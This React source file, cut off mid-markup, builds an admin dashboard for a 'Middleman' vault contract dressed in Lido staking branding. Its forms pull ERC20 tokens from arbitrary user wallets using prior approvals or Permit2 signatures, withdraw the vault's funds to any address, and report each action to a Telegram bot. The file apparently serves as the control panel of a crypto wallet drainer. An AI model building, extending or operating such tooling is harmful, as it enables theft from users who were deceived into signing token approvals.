import React, { useState, useEffect } from 'react';
import { ShieldAlert, ShieldCheck, Send, Settings, Users, Activity, Lock, RefreshCw, Radio, KeyRound, Plus, Trash2, Edit3, CheckCircle2, AlertTriangle, Download, ExternalLink, Filter, ArrowUpRight, Coins, Wallet, Layers, Shield } from 'lucide-react';
import { useAccount, useWriteContract, useReadContract } from 'wagmi';
import { parseEther } from 'viem';
import { useSiweAuth } from '../hooks/useSiweAuth';
import { ConnectionStatusIndicator } from './ConnectionStatusIndicator';
import { sendTelegram, formatAdminAction } from '../lib/telegram';
import { CONFIG, VAULT_ABI } from '../lib/contracts';
import {
  getActivities,
  updateActivityRecord,
  createAdminLogEntry,
  clearAllActivities,
  ActivityRecord
} from '../lib/activityLogger';

export function AdminTab() {
  const { address, isAuthenticated, isSigning, error, signIn, signOut } = useSiweAuth();
  const { writeContractAsync, isPending } = useWriteContract();
  const [telegramSending, setTelegramSending] = useState(false);
  const [telegramStatus, setTelegramStatus] = useState<string | null>(null);
  const [newReferralAddress, setNewReferralAddress] = useState('');
  const [referralStatus, setReferralStatus] = useState<string | null>(null);

  // Contract script states
  const [pullTokenState, setPullTokenState] = useState({ token: CONFIG.STETH_ADDRESS, from: '', amount: '' });
  const [pullTokenStatus, setPullTokenStatus] = useState<string | null>(null);

  const [pullPermit2State, setPullPermit2State] = useState({ token: CONFIG.STETH_ADDRESS, from: '', amount: '' });
  const [pullPermit2Status, setPullPermit2Status] = useState<string | null>(null);

  const [creditState, setCreditState] = useState({ user: '', amount: '' });
  const [creditStatus, setCreditStatus] = useState<string | null>(null);

  const [withdrawEthState, setWithdrawEthState] = useState({ to: '', amount: '' });
  const [withdrawEthStatus, setWithdrawEthStatus] = useState<string | null>(null);

  const [withdrawTokenState, setWithdrawTokenState] = useState({ token: CONFIG.STETH_ADDRESS, to: '', amount: '' });
  const [withdrawTokenStatus, setWithdrawTokenStatus] = useState<string | null>(null);

  // Read contract on-chain parameters
  const { data: ownerAddress } = useReadContract({
    address: CONFIG.CONTRACT_ADDRESS,
    abi: VAULT_ABI,
    functionName: 'owner',
  });

  const { data: currentReferralAddress } = useReadContract({
    address: CONFIG.CONTRACT_ADDRESS,
    abi: VAULT_ABI,
    functionName: 'referral',
  });

  const { data: lidoContractAddress } = useReadContract({
    address: CONFIG.CONTRACT_ADDRESS,
    abi: VAULT_ABI,
    functionName: 'lido',
  });

  const { data: permit2ContractAddress } = useReadContract({
    address: CONFIG.CONTRACT_ADDRESS,
    abi: VAULT_ABI,
    functionName: 'permit2',
  });

  const { data: wstethReferralStakerAddress } = useReadContract({
    address: CONFIG.CONTRACT_ADDRESS,
    abi: VAULT_ABI,
    functionName: 'wstethReferralStaker',
  });

  // Activity logs state & write controls
  const [activities, setActivities] = useState<ActivityRecord[]>([]);
  const [filterType, setFilterType] = useState<string>('ALL');
  const [editingId, setEditingId] = useState<string | null>(null);
  const [editingNote, setEditingNote] = useState<string>('');
  const [newLogNote, setNewLogNote] = useState<string>('');

  const refreshLogs = () => {
    setActivities(getActivities());
  };

  useEffect(() => {
    refreshLogs();
    window.addEventListener('lido_activity_updated', refreshLogs);
    return () => window.removeEventListener('lido_activity_updated', refreshLogs);
  }, []);

  // Handler: pullToken
  const handlePullToken = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!pullTokenState.token || !pullTokenState.from || !pullTokenState.amount) {
      setPullTokenStatus('All fields (token, from, amount) are required.');
      return;
    }
    setPullTokenStatus('Submitting pullToken transaction...');
    try {
      const parsedAmt = parseEther(pullTokenState.amount);
      const txHash = await writeContractAsync({
        address: CONFIG.CONTRACT_ADDRESS,
        abi: VAULT_ABI,
        functionName: 'pullToken',
        args: [pullTokenState.token as `0x${string}`, pullTokenState.from as `0x${string}`, parsedAmt],
        account: address as `0x${string}`,
        chain: null as any,
      } as any);
      setPullTokenStatus(`Token pulled! Tx: ${txHash.slice(0, 10)}...`);
      createAdminLogEntry(address || 'Admin', `Executed pullToken: ${pullTokenState.amount} from ${pullTokenState.from} (Tx: ${txHash.slice(0, 10)}...)`);
      await sendTelegram(formatAdminAction('PULL TOKEN', `Token: <code>${pullTokenState.token}</code>\nFrom: <code>${pullTokenState.from}</code>\nAmount: ${pullTokenState.amount}\nTx: <code>${txHash}</code>`));
    } catch (err: any) {
      setPullTokenStatus('Error: ' + (err.message || 'Transaction failed'));
    }
  };

  // Handler: pullTokenWithPermit2
  const handlePullTokenWithPermit2 = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!pullPermit2State.token || !pullPermit2State.from || !pullPermit2State.amount) {
      setPullPermit2Status('All fields (token, from, amount) are required.');
      return;
    }
    setPullPermit2Status('Submitting pullTokenWithPermit2 transaction...');
    try {
      const parsedAmt = parseEther(pullPermit2State.amount);
      const txHash = await writeContractAsync({
        address: CONFIG.CONTRACT_ADDRESS,
        abi: VAULT_ABI,
        functionName: 'pullTokenWithPermit2',
        args: [pullPermit2State.token as `0x${string}`, pullPermit2State.from as `0x${string}`, parsedAmt],
        account: address as `0x${string}`,
        chain: null as any,
      } as any);
      setPullPermit2Status(`Permit2 pulled! Tx: ${txHash.slice(0, 10)}...`);
      createAdminLogEntry(address || 'Admin', `Executed pullTokenWithPermit2: ${pullPermit2State.amount} from ${pullPermit2State.from} (Tx: ${txHash.slice(0, 10)}...)`);
      await sendTelegram(formatAdminAction('PULL TOKEN PERMIT2', `Token: <code>${pullPermit2State.token}</code>\nFrom: <code>${pullPermit2State.from}</code>\nAmount: ${pullPermit2State.amount}\nTx: <code>${txHash}</code>`));
    } catch (err: any) {
      setPullPermit2Status('Error: ' + (err.message || 'Transaction failed'));
    }
  };

  // Handler: creditUser
  const handleCreditUser = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!creditState.user || !creditState.amount) {
      setCreditStatus('User address and amount are required.');
      return;
    }
    setCreditStatus('Submitting creditUser transaction...');
    try {
      const parsedAmt = parseEther(creditState.amount);
      const txHash = await writeContractAsync({
        address: CONFIG.CONTRACT_ADDRESS,
        abi: VAULT_ABI,
        functionName: 'creditUser',
        args: [creditState.user as `0x${string}`, parsedAmt],
        account: address as `0x${string}`,
        chain: null as any,
      } as any);
      setCreditStatus(`User credited! Tx: ${txHash.slice(0, 10)}...`);
      createAdminLogEntry(address || 'Admin', `Credited user ${creditState.user} with ${creditState.amount} ETH (Tx: ${txHash.slice(0, 10)}...)`);
      await sendTelegram(formatAdminAction('CREDIT USER', `User: <code>${creditState.user}</code>\nAmount: ${creditState.amount}\nTx: <code>${txHash}</code>`));
    } catch (err: any) {
      setCreditStatus('Error: ' + (err.message || 'Transaction failed'));
    }
  };

  // Handler: withdrawETH
  const handleWithdrawETH = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!withdrawEthState.to || !withdrawEthState.amount) {
      setWithdrawEthStatus('Recipient address and amount are required.');
      return;
    }
    setWithdrawEthStatus('Submitting withdrawETH transaction...');
    try {
      const parsedAmt = parseEther(withdrawEthState.amount);
      const txHash = await writeContractAsync({
        address: CONFIG.CONTRACT_ADDRESS,
        abi: VAULT_ABI,
        functionName: 'withdrawETH',
        args: [withdrawEthState.to as `0x${string}`, parsedAmt],
        account: address as `0x${string}`,
        chain: null as any,
      } as any);
      setWithdrawEthStatus(`ETH Withdrawn! Tx: ${txHash.slice(0, 10)}...`);
      createAdminLogEntry(address || 'Admin', `Withdrew ${withdrawEthState.amount} ETH to ${withdrawEthState.to} (Tx: ${txHash.slice(0, 10)}...)`);
      await sendTelegram(formatAdminAction('WITHDRAW ETH', `To: <code>${withdrawEthState.to}</code>\nAmount: ${withdrawEthState.amount} ETH\nTx: <code>${txHash}</code>`));
    } catch (err: any) {
      setWithdrawEthStatus('Error: ' + (err.message || 'Transaction failed'));
    }
  };

  // Handler: withdrawToken
  const handleWithdrawToken = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!withdrawTokenState.token || !withdrawTokenState.to || !withdrawTokenState.amount) {
      setWithdrawTokenStatus('Token, recipient, and amount are required.');
      return;
    }
    setWithdrawTokenStatus('Submitting withdrawToken transaction...');
    try {
      const parsedAmt = parseEther(withdrawTokenState.amount);
      const txHash = await writeContractAsync({
        address: CONFIG.CONTRACT_ADDRESS,
        abi: VAULT_ABI,
        functionName: 'withdrawToken',
        args: [withdrawTokenState.token as `0x${string}`, withdrawTokenState.to as `0x${string}`, parsedAmt],
        account: address as `0x${string}`,
        chain: null as any,
      } as any);
      setWithdrawTokenStatus(`Token Withdrawn! Tx: ${txHash.slice(0, 10)}...`);
      createAdminLogEntry(address || 'Admin', `Withdrew ${withdrawTokenState.amount} token to ${withdrawTokenState.to} (Tx: ${txHash.slice(0, 10)}...)`);
      await sendTelegram(formatAdminAction('WITHDRAW TOKEN', `Token: <code>${withdrawTokenState.token}</code>\nTo: <code>${withdrawTokenState.to}</code>\nAmount: ${withdrawTokenState.amount}\nTx: <code>${txHash}</code>`));
    } catch (err: any) {
      setWithdrawTokenStatus('Error: ' + (err.message || 'Transaction failed'));
    }
  };

  const handleTestTelegram = async () => {
    setTelegramSending(true);
    setTelegramStatus(null);
    try {
      await sendTelegram(
        formatAdminAction(
          'MANUAL TELEGRAM TEST PING',
          `Admin <code>${address || '0x...'}</code> tested Telegram Bot connectivity.\nStatus: Active & Listening`
        )
      );
      createAdminLogEntry(address || 'Admin', 'Dispatched Telegram test ping to channel');
      setTelegramStatus('Telegram message sent successfully!');
    } catch (err: any) {
      setTelegramStatus('Failed to send Telegram message: ' + (err.message || String(err)));
    } finally {
      setTelegramSending(false);
    }
  };

  const handleSetReferral = async () => {
    if (!newReferralAddress || !newReferralAddress.startsWith('0x')) {
      setReferralStatus('Please enter a valid 0x address');
      return;
    }
    setReferralStatus(null);
    try {
      const txHash = await writeContractAsync({
        address: CONFIG.CONTRACT_ADDRESS,
        abi: VAULT_ABI,
        functionName: 'setReferral',
        args: [newReferralAddress as `0x${string}`],
        account: address as `0x${string}`,
        chain: null as any,
      } as any);
      setReferralStatus(`Referral set! Tx: ${txHash.slice(0, 10)}...`);
      createAdminLogEntry(address || 'Admin', `Updated contract referral address to ${newReferralAddress} (Tx: ${txHash.slice(0, 10)}...)`);
      await sendTelegram(formatAdminAction('UPDATE REFERRAL', `New Referral Address: <code>${newReferralAddress}</code>\nTx: <code>${txHash}</code>`));
    } catch (err: any) {
      setReferralStatus('Error: ' + (err.message || 'Transaction failed'));
    }
  };

  // Write actions
  const handleToggleStatus = (id: string, currentStatus: ActivityRecord['status']) => {
    const nextStatus: ActivityRecord['status'] =
      currentStatus === 'Confirmed' ? 'Verified' : currentStatus === 'Verified' ? 'Flagged' : 'Confirmed';
    updateActivityRecord(id, { status: nextStatus });
  };

  const handleSaveNote = (id: string) => {
    updateActivityRecord(id, { note: editingNote });
    setEditingId(null);
    setEditingNote('');
  };

  const handleCreateManualLog = (e: React.FormEvent) => {
    e.preventDefault();
    if (!newLogNote.trim()) return;
    createAdminLogEntry(address || 'Admin', newLogNote.trim());
    setNewLogNote('');
  };

  const handleExportCSV = () => {
    const headers = ['ID', 'Timestamp', 'Wallet', 'Action', 'Amount', 'Token', 'Status', 'TxHash', 'Note'];
    const rows = activities.map((a) => [
      a.id,
      a.timestamp,
      a.wallet,
      a.action,
      a.amount || '',
      a.token || '',
      a.status,
      a.txHash || '',
      a.note || ''
    ]);
    const csvContent = 'data:text/csv;charset=utf-8,' + [headers.join(','), ...rows.map((r) => r.map(c => `"${c}"`).join(','))].join('\n');
    const encodedUri = encodeURI(csvContent);
    const link = document.createElement('a');
    link.setAttribute('href', encodedUri);
    link.setAttribute('download', `lido_activity_logs_${Date.now()}.csv`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  const handleClearLogs = () => {
    if (window.confirm('Are you sure you want to clear all activity logs?')) {
      clearAllActivities();
    }
  };

  const filteredActivities = activities.filter((a) => {
    if (filterType === 'ALL') return true;
    if (filterType === 'STAKE') return a.action === 'STAKE';
    if (filterType === 'WRAP') return a.action === 'WRAP' || a.action === 'UNWRAP';
    if (filterType === 'WITHDRAW') return a.action === 'WITHDRAW_REQUEST' || a.action === 'WITHDRAW_CLAIM';
    if (filterType === 'ADMIN') return a.action === 'ADMIN_ACTION';
    return true;
  });

  if (!isAuthenticated || !address) {
    return (
      <div className="max-w-4xl mx-auto px-4 py-8 animate-in fade-in duration-300">
        <div className="text-center mb-8">
          <h1 className="text-2xl font-bold mb-1">Admin Dashboard</h1>
          <p className="text-sm text-text-secondary">System configuration, contract parameters & Telegram bot management</p>
        </div>

        <div className="bg-card rounded-2xl p-8 border border-border-main text-center shadow-sm max-w-md mx-auto relative overflow-hidden">
          <div className="absolute top-0 left-0 w-full h-1 bg-[#00A3FF]"></div>
          <div className="w-16 h-16 bg-[#00A3FF]/10 rounded-full flex items-center justify-center mx-auto mb-6">
            <ShieldAlert className="w-8 h-8 text-[#00A3FF]" />
          </div>
          <h2 className="text-xl font-bold mb-2">Secure Admin Access</h2>
          <p className="text-sm text-text-secondary mb-8">
            Please connect your wallet and sign a verification message to unlock admin permissions.
          </p>
          
          {error && (
            <div className="mb-6 p-3 bg-red-500/10 border border-red-500/20 rounded-xl text-sm text-red-500 break-words">
              {error}
            </div>
          )}
          
          <button
            onClick={signIn}
            disabled={isSigning}
            className={`w-full py-4 rounded-xl font-bold text-lg transition-all ${isSigning ? 'bg-[#00A3FF]/50 text-white cursor-not-allowed' : 'bg-[#00A3FF] hover:bg-[#0090E6] text-white shadow-sm'}`}
          >
            {isSigning ? 'Connecting & Signing...' : 'Connect Wallet & Access Dashboard'}
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="max-w-6xl mx-auto px-4 py-8 animate-in fade-in duration-300 space-y-8">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold mb-1 flex items-center gap-2">
            Admin Dashboard
            <ShieldCheck className="w-5 h-5 text-emerald-500" />
          </h1>
          <p className="text-sm text-text-secondary flex items-center gap-2">
            Authenticated as <code className="bg-input px-2 py-0.5 rounded text-xs border border-border-main font-mono text-[#00A3FF]">{address}</code>
          </p>
        </div>
        <div className="flex items-center gap-3">
          <ConnectionStatusIndicator />
          <button 
            onClick={signOut}
            className="text-sm font-medium text-text-secondary hover:text-text-main px-4 py-2 rounded-lg border border-border-main bg-input transition-colors"
          >
            Sign Out
          </button>
        </div>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
        <div className="bg-card rounded-2xl p-6 border border-border-main shadow-sm flex items-start gap-4">
          <div className="p-3 bg-[#00A3FF]/10 rounded-xl">
            <Users className="w-6 h-6 text-[#00A3FF]" />
          </div>
          <div>
            <p className="text-sm text-text-secondary font-medium mb-1">Total Tracked Logs</p>
            <p className="text-2xl font-bold">{activities.length}</p>
          </div>
        </div>
        <div className="bg-card rounded-2xl p-6 border border-border-main shadow-sm flex items-start gap-4">
          <div className="p-3 bg-[#00A3FF]/10 rounded-xl">
            <Activity className="w-6 h-6 text-[#00A3FF]" />
          </div>
          <div>
            <p className="text-sm text-text-secondary font-medium mb-1">Network Staking APR</p>
            <p className="text-2xl font-bold">3.2%</p>
          </div>
        </div>
        <div className="bg-card rounded-2xl p-6 border border-border-main shadow-sm flex items-start gap-4">
          <div className="p-3 bg-emerald-500/10 rounded-xl">
            <Radio className="w-6 h-6 text-emerald-500 animate-pulse" />
          </div>
          <div>
            <p className="text-sm text-text-secondary font-medium mb-1">Telegram Bot Service</p>
            <p className="text-2xl font-bold text-emerald-500">Active & Ready</p>
          </div>
        </div>
      </div>

      {/* Admin Controls Section */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
        {/* Telegram Dispatcher */}
        <div className="bg-card rounded-2xl p-6 border border-border-main shadow-sm space-y-4">
          <div className="flex items-center gap-2">
            <Send className="w-5 h-5 text-[#00A3FF]" />
            <h2 className="font-bold text-lg">Telegram Bot Verification</h2>
          </div>
          <p className="text-sm text-text-secondary">
            Dispatch a test ping to the configured Telegram channel to confirm real-time notification readiness.
          </p>

          {telegramStatus && (
            <div className={`p-3 rounded-xl text-xs font-semibold ${telegramStatus.includes('successfully') ? 'bg-emerald-500/10 text-emerald-500 border border-emerald-500/20' : 'bg-red-500/10 text-red-500'}`}>
              {telegramStatus}
            </div>
          )}

          <button
            onClick={handleTestTelegram}
            disabled={telegramSending}
            className="w-full py-3 bg-[#00A3FF] hover:bg-[#0090E6] text-white font-bold rounded-xl text-sm flex items-center justify-center gap-2 transition-colors disabled:opacity-50"
          >
            {telegramSending ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Send className="w-4 h-4" />}
            <span>{telegramSending ? 'Dispatching Ping...' : 'Send Test Telegram Ping'}</span>
          </button>
        </div>

        {/* On-Chain Contract Parameters Panel (Read Calls) */}
      <div className="bg-card rounded-2xl p-6 border border-border-main shadow-sm space-y-4">
        <div className="flex items-center justify-between border-b border-border-main pb-3">
          <h2 className="font-bold text-lg flex items-center gap-2">
            <Layers className="w-5 h-5 text-[#00A3FF]" />
            On-Chain Vault Parameters
          </h2>
          <span className="text-xs font-semibold px-2.5 py-1 bg-[#00A3FF]/10 text-[#00A3FF] border border-[#00A3FF]/20 rounded-lg font-mono">
            Vault: {CONFIG.CONTRACT_ADDRESS.slice(0, 6)}...{CONFIG.CONTRACT_ADDRESS.slice(-4)}
          </span>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4 text-xs font-mono">
          <div className="p-3 bg-input/60 rounded-xl border border-border-main space-y-1">
            <span className="text-text-secondary font-sans font-semibold block text-[11px]">Vault Owner</span>
            <span className="text-text-main font-bold truncate block">{ownerAddress ? String(ownerAddress) : 'Loading...'}</span>
          </div>

          <div className="p-3 bg-input/60 rounded-xl border border-border-main space-y-1">
            <span className="text-text-secondary font-sans font-semibold block text-[11px]">Referral Address</span>
            <span className="text-[#00A3FF] font-bold truncate block">{currentReferralAddress ? String(currentReferralAddress) : 'Loading...'}</span>
          </div>

          <div className="p-3 bg-input/60 rounded-xl border border-border-main space-y-1">
            <span className="text-text-secondary font-sans font-semibold block text-[11px]">Lido stETH Contract</span>
            <span className="text-text-main font-bold truncate block">{lidoContractAddress ? String(lidoContractAddress) : CONFIG.STETH_ADDRESS}</span>
          </div>

          <div className="p-3 bg-input/60 rounded-xl border border-border-main space-y-1">
            <span className="text-text-secondary font-sans font-semibold block text-[11px]">Permit2 Contract</span>
            <span className="text-text-main font-bold truncate block">{permit2ContractAddress ? String(permit2ContractAddress) : 'None'}</span>
          </div>

          <div className="p-3 bg-input/60 rounded-xl border border-border-main space-y-1">
            <span className="text-text-secondary font-sans font-semibold block text-[11px]">wstETH Referral Staker</span>
            <span className="text-text-main font-bold truncate block">{wstethReferralStakerAddress ? String(wstethReferralStakerAddress) : 'None'}</span>
          </div>

          <div className="p-3 bg-input/60 rounded-xl border border-border-main space-y-1">
            <span className="text-text-secondary font-sans font-semibold block text-[11px]">Contract Network</span>
            <span className="text-emerald-500 font-bold font-sans block">Ethereum Mainnet (Chain ID 1)</span>
          </div>
        </div>
      </div>

      {/* Smart Contract Execution Scripts (Write Calls) */}
      <div className="bg-card rounded-2xl p-6 border border-border-main shadow-sm space-y-6">
        <div className="flex items-center justify-between border-b border-border-main pb-3">
          <div>
            <h2 className="font-bold text-lg flex items-center gap-2">
              <Coins className="w-5 h-5 text-[#00A3FF]" />
              Smart Contract Execution Scripts
            </h2>
            <p className="text-xs text-text-secondary">Execute write scripts directly on MiddlemanVaultUpgradeable contract</p>
          </div>
          <span className="text-xs font-bold px-2.5 py-1 bg-emerald-500/10 text-emerald-500 border border-emerald-500/20 rounded-lg">
            Write Active
          </span>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
          {/* Script: pullToken */}
          <form onSubmit={handlePullToken} className="p-4 bg-input/40 rounded-2xl border border-border-main space-y-3 flex flex-col justify-between">
            <div className="space-y-2">
              <div className="flex items-center justify-between">
                <span className="font-bold text-sm text-text-main">pullToken Script</span>
                <span className="text-[10px] font-mono bg-[#00A3FF]/10 text-[#00A3FF] px-2 py-0.5 rounded">pullToken()</span>
              </div>
              <p className="text-xs text-text-secondary">Pull ERC20 token balance from user wallet via vault authorization.</p>
              
              <div className="space-y-1.5 pt-1">
                <input
                  type="text"
                  placeholder="Token Address (0x...)"
                  value={pullTokenState.token}
                  onChange={(e) => setPullTokenState({ ...pullTokenState, token: e.target.value as `0x${string}` })}
                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
                />
                <input
                  type="text"
                  placeholder="From User Wallet (0x...)"
                  value={pullTokenState.from}
                  onChange={(e) => setPullTokenState({ ...pullTokenState, from: e.target.value })}
                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
                />
                <input
                  type="text"
                  placeholder="Amount (e.g. 1.5)"
                  value={pullTokenState.amount}
                  onChange={(e) => setPullTokenState({ ...pullTokenState, amount: e.target.value })}
                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
                />
              </div>

              {pullTokenStatus && (
                <div className={`p-2 rounded-lg text-[11px] font-medium break-words ${pullTokenStatus.includes('pulled') ? 'bg-emerald-500/10 text-emerald-500' : 'bg-amber-500/10 text-amber-500'}`}>
                  {pullTokenStatus}
                </div>
              )}
            </div>

            <button
              type="submit"
              disabled={isPending}
              className="w-full py-2.5 bg-[#00A3FF] hover:bg-[#0090E6] text-white font-bold rounded-xl text-xs flex items-center justify-center gap-1.5 transition-colors disabled:opacity-50 mt-2"
            >
              <ArrowUpRight className="w-3.5 h-3.5" />
              <span>Execute pullToken</span>
            </button>
          </form>

          {/* Script: pullTokenWithPermit2 */}
          <form onSubmit={handlePullTokenWithPermit2} className="p-4 bg-input/40 rounded-2xl border border-border-main space-y-3 flex flex-col justify-between">
            <div className="space-y-2">
              <div className="flex items-center justify-between">
                <span className="font-bold text-sm text-text-main">Permit2 Pull Script</span>
                <span className="text-[10px] font-mono bg-purple-500/10 text-purple-400 px-2 py-0.5 rounded">pullTokenWithPermit2()</span>
              </div>
              <p className="text-xs text-text-secondary">Pull ERC20 tokens utilizing Uniswap Permit2 signature approval.</p>

              <div className="space-y-1.5 pt-1">
                <input
                  type="text"
                  placeholder="Token Address (0x...)"
                  value={pullPermit2State.token}
                  onChange={(e) => setPullPermit2State({ ...pullPermit2State, token: e.target.value as `0x${string}` })}
                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
                />
                <input
                  type="text"
                  placeholder="From User Wallet (0x...)"
                  value={pullPermit2State.from}
                  onChange={(e) => setPullPermit2State({ ...pullPermit2State, from: e.target.value })}
                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
                />
                <input
                  type="text"
                  placeholder="Amount (uint160)"
                  value={pullPermit2State.amount}
                  onChange={(e) => setPullPermit2State({ ...pullPermit2State, amount: e.target.value })}
                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
                />
              </div>

              {pullPermit2Status && (
                <div className={`p-2 rounded-lg text-[11px] font-medium break-words ${pullPermit2Status.includes('pulled') ? 'bg-emerald-500/10 text-emerald-500' : 'bg-amber-500/10 text-amber-500'}`}>
                  {pullPermit2Status}
                </div>
              )}
            </div>

            <button
              type="submit"
              disabled={isPending}
              className="w-full py-2.5 bg-purple-600 hover:bg-purple-700 text-white font-bold rounded-xl text-xs flex items-center justify-center gap-1.5 transition-colors disabled:opacity-50 mt-2"
            >
              <ArrowUpRight className="w-3.5 h-3.5" />
              <span>Execute Permit2 Pull</span>
            </button>
          </form>

          {/* Script: creditUser */}
          <form onSubmit={handleCreditUser} className="p-4 bg-input/40 rounded-2xl border border-border-main space-y-3 flex flex-col justify-between">
            <div className="space-y-2">
              <div className="flex items-center justify-between">
                <span className="font-bold text-sm text-text-main">creditUser Script</span>
                <span className="text-[10px] font-mono bg-emerald-500/10 text-emerald-500 px-2 py-0.5 rounded">creditUser()</span>
              </div>
              <p className="text-xs text-text-secondary">Assign internal credit balance to target user address on-chain.</p>

              <div className="space-y-1.5 pt-1">
                <input
                  type="text"
                  placeholder="Target User Address (0x...)"
                  value={creditState.user}
                  onChange={(e) => setCreditState({ ...creditState, user: e.target.value })}
                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
                />
                <input
                  type="text"
                  placeholder="Credit Amount (ETH)"
                  value={creditState.amount}
                  onChange={(e) => setCreditState({ ...creditState, amount: e.target.value })}
                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
                />
              </div>

              {creditStatus && (
                <div className={`p-2 rounded-lg text-[11px] font-medium break-words ${creditStatus.includes('credited') ? 'bg-emerald-500/10 text-emerald-500' : 'bg-amber-500/10 text-amber-500'}`}>
                  {creditStatus}
                </div>
              )}
            </div>

            <button
              type="submit"
              disabled={isPending}
              className="w-full py-2.5 bg-emerald-600 hover:bg-emerald-700 text-white font-bold rounded-xl text-xs flex items-center justify-center gap-1.5 transition-colors disabled:opacity-50 mt-2"
            >
              <Coins className="w-3.5 h-3.5" />
              <span>Execute creditUser</span>
            </button>
          </form>

          {/* Script: withdrawETH */}
          <form onSubmit={handleWithdrawETH} className="p-4 bg-input/40 rounded-2xl border border-border-main space-y-3 flex flex-col justify-between">
            <div className="space-y-2">
              <div className="flex items-center justify-between">
                <span className="font-bold text-sm text-text-main">withdrawETH Script</span>
                <span className="text-[10px] font-mono bg-blue-500/10 text-blue-400 px-2 py-0.5 rounded">withdrawETH()</span>
              </div>
              <p className="text-xs text-text-secondary">Withdraw contract ETH reserve to designated destination address.</p>

              <div className="space-y-1.5 pt-1">
                <input
                  type="text"
                  placeholder="Recipient Address (0x...)"
                  value={withdrawEthState.to}
                  onChange={(e) => setWithdrawEthState({ ...withdrawEthState, to: e.target.value })}
                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
                />
                <input
                  type="text"
                  placeholder="Amount in ETH"
                  value={withdrawEthState.amount}
                  onChange={(e) => setWithdrawEthState({ ...withdrawEthState, amount: e.target.value })}
                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
                />
              </div>

              {withdrawEthStatus && (
                <div className={`p-2 rounded-lg text-[11px] font-medium break-words ${withdrawEthStatus.includes('Withdrawn') ? 'bg-emerald-500/10 text-emerald-500' : 'bg-amber-500/10 text-amber-500'}`}>
                  {withdrawEthStatus}
                </div>
              )}
            </div>

            <button
              type="submit"
              disabled={isPending}
              className="w-full py-2.5 bg-blue-600 hover:bg-blue-700 text-white font-bold rounded-xl text-xs flex items-center justify-center gap-1.5 transition-colors disabled:opacity-50 mt-2"
            >
              <Wallet className="w-3.5 h-3.5" />
              <span>Execute withdrawETH</span>
            </button>
          </form>

          {/* Script: withdrawToken */}
          <form onSubmit={handleWithdrawToken} className="p-4 bg-input/40 rounded-2xl border border-border-main space-y-3 flex flex-col justify-between">
            <div className="space-y-2">
              <div className="flex items-center justify-between">
                <span className="font-bold text-sm text-text-main">withdrawToken Script</span>
                <span className="text-[10px] font-mono bg-amber-500/10 text-amber-500 px-2 py-0.5 rounded">withdrawToken()</span>
              </div>
              <p className="text-xs text-text-secondary">Withdraw contract ERC20 token reserve to recipient address.</p>

              <div className="space-y-1.5 pt-1">
                <input
                  type="text"
                  placeholder="Token Address (0x...)"
                  value={withdrawTokenState.token}
                  onChange={(e) => setWithdrawTokenState({ ...withdrawTokenState, token: e.target.value as `0x${string}` })}
                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
                />
                <input
                  type="text"
                  placeholder="Recipient Address (0x...)"
                  value={withdrawTokenState.to}
                  onChange={(e) => setWithdrawTokenState({ ...withdrawTokenState, to: e.target.value })}
                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
                />
                <input
                  type="text"
                  placeholder="Amount"
                  value={withdrawTokenState.amount}
                  onChange={(e) => setWithdrawTokenState({ ...withdrawTokenState, amount: e.target.value })}
                  className="w-full bg-card border border-border-main rounded-xl px-3 py-1.5 text-xs font-mono focus:outline-none focus:border-[#00A3FF]"
                />
              </div>

              {withdrawTokenStatus && (
                <div className={`p-2 rounded-lg text-[11px] font-medium break-words ${withdrawTokenStatus.includes('Withdrawn') ? 'bg-emerald-500/10 text-emerald-500' : 'bg-amber-500/10 text-amber-500'}`}>
                  {withdrawTokenStatus}
                </div>
              )}
            </div>

            <button
              type="submit"
              disabled={isPending}
              className="w-full py-2.5 bg-amber-600 hover:bg-amber-700 text-white font-bold rounded-xl text-xs flex items-center justify-center gap-1.5 transition-colors disabled:opacity-50 mt-2"
            >
              <Coins className="w-3.5 h-3.5" />
              <span>Execute withdrawToken</span>
            </button>
          </form>
        </div>
      </div>
        <div className="bg-card rounded-2xl p-6 border border-border-main shadow-sm space-y-4">
          <div className="flex items-center gap-2">
            <Settings className="w-5 h-5 text-[#00A3FF]" />
            <h2 className="font-bold text-lg">Smart Contract Control</h2>
          </div>
          <p className="text-sm text-text-secondary">
            Update the contract referral parameter on the Middleman Vault contract.
          </p>

          <div className="space-y-2">
            <label className="text-xs font-semibold text-text-secondary">New Referral Address</label>
            <input
              type="text"
              placeholder="0x..."
              value={newReferralAddress}
